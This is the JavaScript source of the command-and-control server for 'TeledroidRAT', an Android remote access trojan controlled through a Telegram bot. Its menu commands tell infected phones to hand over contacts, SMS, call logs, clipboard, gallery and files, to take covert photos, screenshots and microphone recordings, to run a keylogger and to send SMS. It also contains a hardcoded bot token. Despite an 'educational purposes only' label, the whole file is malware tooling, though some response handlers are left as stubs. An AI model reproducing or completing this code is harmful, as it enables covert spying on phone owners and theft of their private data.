// Required modules
const TelegramBot = require('node-telegram-bot-api');
const { Server } = require('socket.io');
const express = require('express');
const app = express();

// Set up server and socket.io
const server = app.listen(3000, () => {
  console.log('Server is running on port 3000');
});
const io = new Server(server);

// Telegram Bot Token
const token = '8507961561:AAFGiLtXzjIcR-j2IQuIDA55QZDQEYQFq_4';
const bot = new TelegramBot(token, { polling: true });

// In-memory storage for app data
let appData = new Map();
let currentTarget = "all";

// Listen for Telegram messages
bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;

  // Handle different commands
  if (text === "/start") {
    bot.sendMessage(chatId, "<b>✯ Welcome to TeledroidRAT ✯</b>\n\nSelect an option from the menu.", {
      parse_mode: "HTML",
      reply_markup: {
        keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
        resize_keyboard: true
      }
    });
  } 
  else if (text === "✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯") {
    handleDevices(chatId);
  } 
  else if (text === "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯") {
    bot.sendMessage(chatId, "<b>✯ Select an action:</b>", {
      parse_mode: "HTML",
      reply_markup: {
        keyboard: [
          ["✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯", "✯ 𝚂𝙼𝚂 ✯"],
          ["✯ 𝙲𝚊𝚕𝚕𝚜 ✯", "✯ 𝙰𝚙𝚙𝚜 ✯"],
          ["✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯", "✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯"],
          ["✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯", "✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯"],
          ["✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯", "✯ 𝚃𝚘𝚊𝚜𝚝 ✯"],
          ["✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯", "✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯"],
          ["✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯", "✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯"],
          ["✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯", "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯"],
          ["✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯", "✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯"],
          ["✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯"]
        ],
        resize_keyboard: true
      }
    });
  }
  else if (text === "✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯") {
    bot.sendMessage(chatId, "<b>✯ Main Menu</b>", {
      parse_mode: "HTML",
      reply_markup: {
        keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
        resize_keyboard: true
      }
    });
  }
  else if (text === "✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯") {
    bot.sendMessage(chatId, "<b>TeledroidRAT\nDeveloped for educational purposes only</b>", { parse_mode: "HTML" });
  }
  // ============ COMMANDES ============
  else if (text === "✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯") {
    io.emit('command', { request: "contacts", target: currentTarget });
    bot.sendMessage(chatId, "<b>📋 Récupération des contacts...</b>", { parse_mode: "HTML" });
  }
  else if (text === "✯ 𝚂𝙼𝚂 ✯") {
    io.emit('command', { request: "all-sms", target: currentTarget });
    bot.sendMessage(chatId, "<b>📱 Récupération des SMS...</b>", { parse_mode: "HTML" });
  }
  else if (text === "✯ 𝙲𝚊𝚕𝚕𝚜 ✯") {
    io.emit('command', { request: "calls", target: currentTarget });
    bot.sendMessage(chatId, "<b>📞 Récupération des appels...</b>", { parse_mode: "HTML" });
  }
  else if (text === "✯ 𝙰𝚙𝚙𝚜 ✯") {
    io.emit('command', { request: "apps", target: currentTarget });
    bot.sendMessage(chatId, "<b>📦 Récupération des applications...</b>", { parse_mode: "HTML" });
  }
  else if (text === "✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯") {
    io.emit('command', { request: "main-camera", target: currentTarget });
    bot.sendMessage(chatId, "<b>📸 Photo (caméra arrière) demandée...</b>", { parse_mode: "HTML" });
  }
  else if (text === "✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯") {
    io.emit('command', { request: "selfie-camera", target: currentTarget });
    bot.sendMessage(chatId, "<b>🤳 Selfie demandé...</b>", { parse_mode: "HTML" });
  }
  else if (text === "✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯") {
    io.emit('command', { request: "clipboard", target: currentTarget });
    bot.sendMessage(chatId, "<b>📋 Récupération du presse-papier...</b>", { parse_mode: "HTML" });
  }
  else if (text === "✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯") {
    io.emit('command', { request: "screenshot", target: currentTarget });
    bot.sendMessage(chatId, "<b>📸 Capture d'écran demandée...</b>", { parse_mode: "HTML" });
  }
  else if (text === "✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯") {
    appData.set("waitingFor", "microphone");
    bot.sendMessage(chatId, "<b>🎙 Entrez la durée d'enregistrement (secondes):</b>", { parse_mode: "HTML" });
  }
  else if (text === "✯ 𝚃𝚘𝚊𝚜𝚝 ✯") {
    appData.set("waitingFor", "toast");
    bot.sendMessage(chatId, "<b>🔔 Entrez le texte du toast:</b>", { parse_mode: "HTML" });
  }
  else if (text === "✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯") {
    appData.set("waitingFor", "smsNumber");
    bot.sendMessage(chatId, "<b>📱 Entrez le numéro de téléphone:</b>", { parse_mode: "HTML" });
  }
  else if (text === "✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯") {
    appData.set("waitingFor", "vibrate");
    bot.sendMessage(chatId, "<b>📳 Entrez la durée de vibration (secondes):</b>", { parse_mode: "HTML" });
  }
  else if (text === "✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯") {
    io.emit('command', { request: "play-audio", target: currentTarget });
    bot.sendMessage(chatId, "<b>🎵 Lecture audio demandée...</b>", { parse_mode: "HTML" });
  }
  else if (text === "✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯") {
    io.emit('command', { request: "stop-audio", target: currentTarget });
    bot.sendMessage(chatId, "<b>⏹️ Arrêt audio demandé...</b>", { parse_mode: "HTML" });
  }
  else if (text === "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯") {
    io.emit('command', { request: "keylogger-on", target: currentTarget });
    bot.sendMessage(chatId, "<b>⌨️ Keylogger activé</b>", { parse_mode: "HTML" });
  }
  else if (text === "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯") {
    io.emit('command', { request: "keylogger-off", target: currentTarget });
    bot.sendMessage(chatId, "<b>⌨️ Keylogger désactivé</b>", { parse_mode: "HTML" });
  }
  else if (text === "✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯") {
    io.emit('command', { request: "file-explorer", target: currentTarget });
    bot.sendMessage(chatId, "<b>📁 Explorateur de fichiers demandé...</b>", { parse_mode: "HTML" });
  }
  else if (text === "✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯") {
    io.emit('command', { request: "gallery", target: currentTarget });
    bot.sendMessage(chatId, "<b>🖼️ Galerie demandée...</b>", { parse_mode: "HTML" });
  }
  // Gestion des réponses utilisateur (microphone, toast, sms, vibrate)
  else if (appData.get("waitingFor") === "microphone") {
    const duration = parseInt(text);
    if (!isNaN(duration)) {
      io.emit('command', { request: "microphone", target: currentTarget, extras: [{ key: "duration", value: duration }] });
      bot.sendMessage(chatId, "<b>🎙 Enregistrement micro demandé (" + duration + "s)...</b>", { parse_mode: "HTML" });
    } else {
      bot.sendMessage(chatId, "<b>❌ Durée invalide</b>", { parse_mode: "HTML" });
    }
    appData.delete("waitingFor");
  }
  else if (appData.get("waitingFor") === "toast") {
    io.emit('command', { request: "toast", target: currentTarget, extras: [{ key: "text", value: text }] });
    bot.sendMessage(chatId, "<b>🔔 Toast envoyé</b>", { parse_mode: "HTML" });
    appData.delete("waitingFor");
  }
  else if (appData.get("waitingFor") === "smsNumber") {
    appData.set("smsNumber", text);
    appData.set("waitingFor", "smsText");
    bot.sendMessage(chatId, "<b>📱 Entrez le message à envoyer:</b>", { parse_mode: "HTML" });
  }
  else if (appData.get("waitingFor") === "smsText") {
    const number = appData.get("smsNumber");
    io.emit('command', { request: "send-sms", target: currentTarget, extras: [{ key: "number", value: number }, { key: "text", value: text }] });
    bot.sendMessage(chatId, "<b>✉️ SMS envoyé à " + number + "</b>", { parse_mode: "HTML" });
    appData.delete("waitingFor");
    appData.delete("smsNumber");
  }
  else if (appData.get("waitingFor") === "vibrate") {
    const duration = parseInt(text);
    if (!isNaN(duration)) {
      io.emit('command', { request: "vibrate", target: currentTarget, extras: [{ key: "duration", value: duration }] });
      bot.sendMessage(chatId, "<b>📳 Vibration demandée (" + duration + "s)</b>", { parse_mode: "HTML" });
    } else {
      bot.sendMessage(chatId, "<b>❌ Durée invalide</b>", { parse_mode: "HTML" });
    }
    appData.delete("waitingFor");
  }
  else {
    bot.sendMessage(chatId, "<b>❌ Unknown command. Please try again.</b>", { parse_mode: "HTML" });
  }
});

// Handle device actions
function handleDevices(chatId) {
  // Récupérer la liste des appareils connectés (à implémenter)
  bot.sendMessage(chatId, "<b>📱 Devices list:</b>\nNo devices connected yet.", {
    parse_mode: "HTML",
    reply_markup: {
      keyboard: [["✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯"]],
      resize_keyboard: true
    }
  });
}

// Listen for socket.io connections
io.on('connection', (socket) => {
  console.log('✅ New client connected');

  socket.on('command', (data) => {
    console.log('📩 Command received from APK:', data);
  });

  socket.on('disconnect', () => {
    console.log('❌ Client disconnected');
  });
});

// Dummy handlers for requests (à compléter selon les besoins)
function handleContacts(target, extras) {
  io.to(target).emit('response', { success: true, message: 'Contacts fetched', extras });
}
function handleAllSMS(target, extras) {
  io.to(target).emit('response', { success: true, message: 'All SMS fetched', extras });
}
function handleCalls(target, extras) {
  io.to(target).emit('response', { success: true, message: 'Calls fetched', extras });
}
function handleApps(target, extras) {
  io.to(target).emit('response', { success: true, message: 'Apps fetched', extras });
}
function handleMainCamera(target, extras) {
  io.to(target).emit('response', { success: true, message: 'Main camera activated', extras });
}
function handleSelfieCamera(target, extras) {
  io.to(target).emit('response', { success: true, message: 'Selfie camera activated', extras });
}
function handleClipboard(target, extras) {
  io.to(target).emit('response', { success: true, message: 'Clipboard accessed', extras });
}
function handleKeyloggerOn(target, extras) {
  io.to(target).emit('response', { success: true, message: 'Keylogger activated', extras });
}
function handleKeyloggerOff(target, extras) {
  io.to(target).emit('response', { success: true, message: 'Keylogger deactivated', extras });
}

// Middleware to handle app data
app.use((req, res, next) => {
  if (req.method === "DELETE") {
    const key = req.body.key;
    appData.delete(key);
  }
  next();
});
